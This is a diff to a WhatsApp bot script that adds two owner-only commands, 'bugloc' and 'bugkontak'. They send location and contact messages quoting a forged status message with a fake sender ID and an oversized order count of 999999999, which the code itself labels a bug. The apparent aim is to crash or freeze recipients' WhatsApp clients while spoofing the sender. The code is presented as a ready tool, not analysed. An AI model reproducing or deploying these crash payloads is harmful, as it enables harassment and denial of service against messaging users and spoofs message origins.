@@ -1293,6 +1293,65 @@ break
                 drm.modifyChat(_.jid, ChatModification.unarchive)
                 }
                 break
+case 'bugloc':
+						if(!mek.key.fromMe)return reply(mess.only.owner)
+if(!q) return reply(`Example : ${prefix}bugloc Rumah doi|Jl.`)
+namaxx = q.split('|')[0]
+jlnxx = q.split('|')[1]
+drm.sendMessage(from, { "degreesLatitude": 37.38980827772353,
+						"degreesLongitude": -122.08141386508942,
+            "name": namaxx,
+            "address": jlnxx,
+            "jpegThumbnail": fakeimage }, location, { quoted:{
+				  key: {
+				   fromMe: false,
+				   participant: `0@s.whatsapp.net`, // Fake sender Jid
+				   remoteJid: "status@broadcast"
+				  },
+				  message: {
+				   orderMessage: {
+				    itemCount: 999999999, // Bug
+				    status: 1,
+				    surface: 1,
+				    message: '999999999',
+				    orderTitle: '999999999', // Idk what this does
+				    sellerJid: `0@s.whatsapp.net` // Seller
+				   }
+				  }
+				 }
+				})
+					break
+					
+			case 'bugkontak':
+						if(!mek.key.fromMe)return reply(mess.only.owner)
+          if(!q) return reply(`Example : ${prefix}bugkontak nama|nomor`)
+nama = q.split('|')[0]
+nomor = q.split('|')[1]
+					const vcardd = 'BEGIN:VCARD\n'
+                                                    + 'VERSION:3.0\n'
+                                                    + `FN:${nama}\n`
+                                                    + `ORG:${nama};\n`
+                                                    + `TEL;type=CELL;type=VOICE;waid=${nomor}:${nomor}\n`
+                                                    + 'END:VCARD'
+					drm.sendMessage(from, {displayname: mem, vcard: vcardd}, MessageType.contact, { quoted:{
+				  key: {
+				   fromMe: false,
+				   participant: `0@s.whatsapp.net`, // Fake sender Jid
+				   remoteJid: "status@broadcast"
+				  },
+				  message: {
+				   orderMessage: {
+				    itemCount: 999999999, // Bug
+				    status: 1,
+				    surface: 1,
+				    message: '999999999',
+				    orderTitle: '999999999', // Idk what this does
+				    sellerJid: `0@s.whatsapp.net` // Seller
+				   }
+				  }
+				 }
+				})
+					break
                      case 'ytplay':
 			
                 if (args.length < 1) return reply(`judul mana broh?\ncontoh : ${prefix + command} Melukis Senja`)
